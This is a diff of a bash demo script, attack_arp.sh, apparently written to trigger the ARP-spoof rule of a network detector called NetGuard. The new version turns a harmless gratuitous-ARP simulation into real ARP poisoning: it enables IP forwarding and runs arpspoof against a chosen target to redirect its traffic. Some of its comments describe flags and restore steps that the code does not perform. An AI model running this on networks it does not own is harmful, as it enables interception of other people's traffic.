@@ -1,67 +1,47 @@
-#!/bin/bash
-# =============================================================================
-# attack_arp.sh — ARP Spoofing Attack Simulation
+#!/usr/bin/env bash
+# attack_arp.sh — ARP spoofing attack on the local network
 #
-# Sends gratuitous ARP replies with conflicting MAC addresses for the gateway
-# IP. Detected by ArpSpoofRule when two or more unique MACs claim the same IP.
+# Requirements: arpspoof (dsniff package)
+#   sudo apt install dsniff
 #
-# Requirements: 8.1
-# Tools: arpspoof (from dsniff), or Python fallback with scapy
-# Usage:  ./demo/attack_arp.sh [gateway_ip] [interface]
-#         Default: 192.168.1.1 on eth0
-# =============================================================================
+# Usage: sudo bash attack_arp.sh <TARGET_IP> <GATEWAY_IP>
+# Example: sudo bash attack_arp.sh 192.168.1.50 192.168.1.1
+#
+# What it triggers: ArpSpoofRule detects when two different MAC addresses
+# claim the same IP, firing an alert at confidence 97-100.
+#
+# This script sends ARP replies poisoning the target's ARP cache to
+# redirect its traffic through this Kali machine.
 
 set -euo pipefail
 
-GATEWAY="${1:-192.168.1.1}"
-INTERFACE="${2:-eth0}"
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-LOG_FILE="${SCRIPT_DIR}/attack_arp.log"
+TARGET="${1:-}"
+GATEWAY="${2:-}"
 
-echo "[*] ARP Spoofing Attack" | tee "${LOG_FILE}"
-echo "[*] Target gateway: ${GATEWAY} on ${INTERFACE}" | tee -a "${LOG_FILE}"
-
-if command -v arpspoof &>/dev/null; then
-    echo "[*] Using arpspoof (dsniff)..." | tee -a "${LOG_FILE}"
-
-    # Send a few gratuitous ARP replies with a fake MAC
-    # Run in background and kill after a few seconds
-    timeout 5 arpspoof -i "${INTERFACE}" -t "${GATEWAY}" "${GATEWAY}" 2>&1 | tee -a "${LOG_FILE}" || true
-
-    echo "[*] ARP spoofing attempt complete." | tee -a "${LOG_FILE}"
-
-elif python3 -c "import scapy.all" 2>/dev/null; then
-    echo "[*] Using Python + Scapy fallback..." | tee -a "${LOG_FILE}"
-
-    python3 -c "
-import scapy.all as scapy
-import time
-
-gateway = '${GATEWAY}'
-iface   = '${INTERFACE}'
-
-# Fake MAC addresses to simulate spoofing
-fake_macs = ['02:ba:be:ca:ff:ee', '02:de:ad:be:ef:01', '02:ca:fe:ba:be:02']
-
-print('[*] Sending gratuitous ARP replies with conflicting MACs...')
-for i, mac in enumerate(fake_macs):
-    pkt = scapy.ARP(
-        op=2,          # is-at (reply)
-        psrc=gateway,  # spoofed source IP
-        hwsrc=mac,     # spoofed source MAC
-        pdst=gateway,  # target IP
-        hwdst='ff:ff:ff:ff:ff:ff'  # broadcast
-    )
-    scapy.send(pkt, iface=iface, verbose=False)
-    print(f'  → Sent ARP reply: {gateway} is at {mac}')
-    time.sleep(0.5)
-print('[*] ARP spoofing simulation complete.')
-" 2>&1 | tee -a "${LOG_FILE}"
-
-else
-    echo "[!] Neither arpspoof nor Scapy available." | tee -a "${LOG_FILE}"
-    echo "[!] Install: sudo apt-get install dsniff  or  pip install scapy" | tee -a "${LOG_FILE}"
-    exit 1
+if [[ -z "$TARGET" || -z "$GATEWAY" ]]; then
+  echo "Usage: sudo bash attack_arp.sh <TARGET_IP> <GATEWAY_IP>"
+  echo "Example: sudo bash attack_arp.sh 192.168.1.50 192.168.1.1"
+  exit 1
 fi
 
-echo "[*] ARP spoofing simulation complete." | tee -a "${LOG_FILE}"
+# Enable IP forwarding so traffic still flows while poisoning
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+echo "[*] ARP poisoning: telling $TARGET that we are $GATEWAY"
+echo "[*] Sending 10 poisoned ARP replies — NetGuard should alert."
+echo "[*] Press Ctrl+C to stop."
+
+# -r   poison both target and gateway (bidirectional)
+# -c 10 send 10 gratuitous ARPs (enough to trigger detection)
+arpspoof -i "$(ip route | grep default | awk '{print $5}' | head -1)" \
+  -t "$TARGET" "$GATEWAY" &
+SPOOF_PID=$!
+
+sleep 5
+
+kill "$SPOOF_PID" 2>/dev/null || true
+
+# Restore ARP tables
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+echo "[✓] ARP spoof complete. Check the NetGuard dashboard for the alert."
